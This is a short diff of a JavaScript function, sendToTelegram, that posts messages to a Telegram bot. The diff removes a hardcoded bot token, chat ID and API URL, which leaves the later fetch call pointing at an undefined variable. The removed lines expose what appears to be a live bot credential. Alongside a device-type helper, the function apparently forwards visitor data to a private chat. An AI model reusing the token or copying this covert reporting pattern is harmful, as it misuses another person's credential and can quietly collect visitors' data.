@@ -53,9 +53,7 @@ function getDeviceType() {
 
 // Function to send data to Telegram bot
 async function sendToTelegram(message) {
-    const botToken = '7772131223:AAHoGl6iKgAq9DFKwlMXziG86sQe60e3jpg';
-    const chatId = '1188723028';
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    
 
     try {
         const response = await fetch(url, {
